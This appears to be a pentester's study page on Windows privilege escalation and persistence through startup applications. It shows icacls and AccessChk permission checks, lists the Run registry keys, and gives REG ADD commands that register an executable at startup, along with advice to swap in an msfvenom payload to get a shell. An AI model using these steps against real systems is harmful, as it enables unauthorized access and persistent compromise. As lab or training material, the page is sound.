---
icon: flag-checkered
---

# Startup Applications

## Checking File/Directory Access

If we have full directory access or access, or FILE\_ALL\_ACCESS on a file that runs at startup, we can add/replace those with a malicious file to get a shell

* Create the payload with msfvenom
* Create a listener
* Wait for the file to be executed

```bash
icacls.exe [file or directory]
```

## Checking Registry Access

To check write access for the registry, AccessChk from Sysinternals is the best option:

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" %}

```bash
accesschk.exe -k [Key_Path] [Username]
```

The startup applications in Windows can be stored in specific registry locations.

* For applications that run at startup for all users, the registry paths are:
  * HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
  * HKLM\Software\Microsoft\Windows\CurrentVersion\Run
* For applications that run at startup for the current user, the registry path is:
  * HKCU\Software\Microsoft\Windows\CurrentVersion\Run

### Adding File to Run at Startup in Registry

* **For Current User (Run as Normal User):**

{% code overflow="wrap" %}
```bash
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "MyApp" /t REG_SZ /F /D "C:\Path\To\Your\File.exe"
```
{% endcode %}

* **For All Users (Requires Admin):**

{% code overflow="wrap" %}
```bash
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "MyApp" /t REG_SZ /F /D "C:\Path\To\Your\File.exe"
```
{% endcode %}
